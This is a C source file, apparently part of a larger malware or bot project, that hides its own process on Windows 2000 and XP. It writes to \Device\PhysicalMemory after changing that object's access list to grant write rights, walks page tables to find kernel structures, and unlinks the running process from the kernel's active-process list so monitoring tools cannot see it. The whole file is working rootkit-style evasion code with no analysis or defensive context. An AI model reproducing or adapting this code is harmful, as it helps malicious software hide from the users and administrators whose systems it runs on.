#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/externs.h"

#include<Accctrl.h>
#include<Aclapi.h> 

//#include"HideProcess.h"

#define NT_SUCCESS(Status)((NTSTATUS)(Status) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)

typedef LONG NTSTATUS;

typedef struct _IO_STATUS_BLOCK
{
NTSTATUS Status;
ULONG Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _UNICODE_STRING
{
USHORT Length;
USHORT MaximumLength;
PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

#define OBJ_INHERIT 0x00000002L
#define OBJ_PERMANENT 0x00000010L
#define OBJ_EXCLUSIVE 0x00000020L
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define OBJ_OPENIF 0x00000080L
#define OBJ_OPENLINK 0x00000100L
#define OBJ_KERNEL_HANDLE 0x00000200L
#define OBJ_VALID_ATTRIBUTES 0x000003F2L

typedef struct _OBJECT_ATTRIBUTES
{
ULONG Length;
HANDLE RootDirectory;
PUNICODE_STRING ObjectName;
ULONG Attributes;
PVOID SecurityDescriptor;
PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (CALLBACK* ZWOPENSECTION)(
OUT PHANDLE SectionHandle,
IN ACCESS_MASK DesiredAccess,
IN POBJECT_ATTRIBUTES ObjectAttributes
);

typedef VOID (CALLBACK* RTLINITUNICODESTRING)(
IN OUT PUNICODE_STRING DestinationString,
IN PCWSTR SourceString
);


BOOL InitNTDLL();
VOID CloseNTDLL();
VOID SetPhyscialMemorySectionCanBeWrited(HANDLE hSection);
HANDLE OpenPhysicalMemory();
PVOID LinearToPhys(PULONG BaseAddress, PVOID addr);
ULONG GetData(PVOID addr);
BOOL SetData(PVOID addr,ULONG data);
long __stdcall exeception(struct _EXCEPTION_POINTERS *tmp);
BOOL YHideProcess();
BOOL HideProcess();



RTLINITUNICODESTRING RtlInitUnicodeString;
ZWOPENSECTION ZwOpenSection;
HMODULE g_hNtDLL = NULL;
PVOID g_pMapPhysicalMemory = NULL;
HANDLE g_hMPM = NULL;
OSVERSIONINFO g_osvi;
//---------------------------------------------------------------------------
BOOL InitNTDLL()
{
g_hNtDLL = LoadLibrary("ntdll.dll");

if (NULL == g_hNtDLL)
return FALSE;

RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress( g_hNtDLL,

"RtlInitUnicodeString");
ZwOpenSection = (ZWOPENSECTION)GetProcAddress( g_hNtDLL, "ZwOpenSection");

return TRUE;
}
//---------------------------------------------------------------------------
VOID CloseNTDLL()
{
if(NULL != g_hNtDLL)
FreeLibrary(g_hNtDLL);

g_hNtDLL = NULL;
}
//---------------------------------------------------------------------------
VOID SetPhyscialMemorySectionCanBeWrited(HANDLE hSection)
{
PACL pDacl = NULL;
PSECURITY_DESCRIPTOR pSD = NULL;
PACL pNewDacl = NULL;

DWORD dwRes = GetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL,
NULL, &pDacl, NULL, &pSD);

if(ERROR_SUCCESS != dwRes)
{

if(pSD)
LocalFree(pSD);
if(pNewDacl)
LocalFree(pNewDacl);
}

EXPLICIT_ACCESS ea;
RtlZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
ea.grfAccessPermissions = SECTION_MAP_WRITE;
ea.grfAccessMode = GRANT_ACCESS;
ea.grfInheritance= NO_INHERITANCE;
ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
ea.Trustee.ptstrName = "CURRENT_USER";

dwRes = SetEntriesInAcl(1,&ea,pDacl,&pNewDacl);

if(ERROR_SUCCESS != dwRes)
{

if(pSD)
LocalFree(pSD);
if(pNewDacl)
LocalFree(pNewDacl);
}
dwRes = SetSecurityInfo

(hSection,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,pNewDacl,NULL);

if(ERROR_SUCCESS != dwRes)
{

if(pSD)
LocalFree(pSD);
if(pNewDacl)
LocalFree(pNewDacl);
}

}
//---------------------------------------------------------------------------


HANDLE OpenPhysicalMemory()
{
NTSTATUS status;
UNICODE_STRING physmemString;
OBJECT_ATTRIBUTES attributes;
ULONG PhyDirectory;

g_osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
GetVersionEx (&g_osvi);

if (5 != g_osvi.dwMajorVersion)
return NULL;

switch(g_osvi.dwMinorVersion)
{
case 0:
PhyDirectory = 0x30000;
break; //2k
case 1:
PhyDirectory = 0x39000;
break; //xp
default:
return NULL;
}

RtlInitUnicodeString(&physmemString, L"\\Device\\PhysicalMemory");

attributes.Length = sizeof(OBJECT_ATTRIBUTES);
attributes.RootDirectory = NULL;
attributes.ObjectName = &physmemString;
attributes.Attributes = 0;
attributes.SecurityDescriptor = NULL;
attributes.SecurityQualityOfService = NULL;

status = ZwOpenSection(&g_hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes);

if(status == STATUS_ACCESS_DENIED)
{
status = ZwOpenSection(&g_hMPM, READ_CONTROL|WRITE_DAC, &attributes);
SetPhyscialMemorySectionCanBeWrited(g_hMPM);
CloseHandle(g_hMPM);
status = ZwOpenSection(&g_hMPM, SECTION_MAP_READ|SECTION_MAP_WRITE, &attributes);
}

if(!NT_SUCCESS(status))
return NULL;

g_pMapPhysicalMemory = MapViewOfFile(g_hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, PhyDirectory,

0x1000);

if( g_pMapPhysicalMemory == NULL )
return NULL;

return g_hMPM;
}
//---------------------------------------------------------------------------
PVOID LinearToPhys(PULONG BaseAddress, PVOID addr)
{
ULONG VAddr = (ULONG)addr,PGDE,PTE,PAddr;
PGDE = BaseAddress[VAddr>>22];

if (0 == (PGDE&1))
return 0;

ULONG tmp = PGDE & 0x00000080;

if (0 != tmp)
{
PAddr = (PGDE & 0xFFC00000) + (VAddr & 0x003FFFFF);
}
else
{
PGDE = (ULONG)MapViewOfFile(g_hMPM, 4, 0, PGDE & 0xfffff000, 0x1000);
PTE = ((PULONG)PGDE)[(VAddr&0x003FF000)>>12];

if (0 == (PTE&1))
return 0;

PAddr=(PTE&0xFFFFF000)+(VAddr&0x00000FFF);
UnmapViewOfFile((PVOID)PGDE);
}

return (PVOID)PAddr;
}
//---------------------------------------------------------------------------
ULONG GetData(PVOID addr)
{
ULONG phys = (ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory, (PVOID)addr);
PULONG tmp = (PULONG)MapViewOfFile(g_hMPM, FILE_MAP_READ|FILE_MAP_WRITE, 0, phys &

0xfffff000, 0x1000);

if (0 == tmp)
return 0;

ULONG ret = tmp[(phys & 0xFFF)>>2];
UnmapViewOfFile(tmp);

return ret;
}
//---------------------------------------------------------------------------
BOOL SetData(PVOID addr,ULONG data)
{
ULONG phys = (ULONG)LinearToPhys((PULONG)g_pMapPhysicalMemory, (PVOID)addr);
PULONG tmp = (PULONG)MapViewOfFile(g_hMPM, FILE_MAP_WRITE, 0, phys & 0xfffff000, 0x1000);

if (0 == tmp)
return FALSE;

tmp[(phys & 0xFFF)>>2] = data;
UnmapViewOfFile(tmp);

return TRUE;
}
//---------------------------------------------------------------------------
long __stdcall exeception(struct _EXCEPTION_POINTERS *tmp)
{
ExitProcess(0);
return 1 ;
}
//---------------------------------------------------------------------------
BOOL YHideProcess()
{
// SetUnhandledExceptionFilter(exeception);

if (FALSE == InitNTDLL())
return FALSE;

if (0 == OpenPhysicalMemory())
return FALSE;

ULONG thread = GetData((PVOID)0xFFDFF124); //kteb
ULONG process = GetData((PVOID)(thread + 0x44)); //kpeb

ULONG fw, bw;
if (0 == g_osvi.dwMinorVersion)
{
fw = GetData((PVOID)(process + 0xa0));
bw = GetData((PVOID)(process + 0xa4));
}

if (1 == g_osvi.dwMinorVersion)
{
fw = GetData((PVOID)(process + 0x88));
bw = GetData((PVOID)(process + 0x8c));
}

SetData((PVOID)(fw + 4), bw);
SetData((PVOID)(bw), fw);

CloseHandle(g_hMPM);
CloseNTDLL();

return TRUE;
}

BOOL HideProcess()
{
static BOOL b_hide = FALSE;
if (!b_hide)
{
b_hide = TRUE;
YHideProcess();
return TRUE;
}
return TRUE;
}

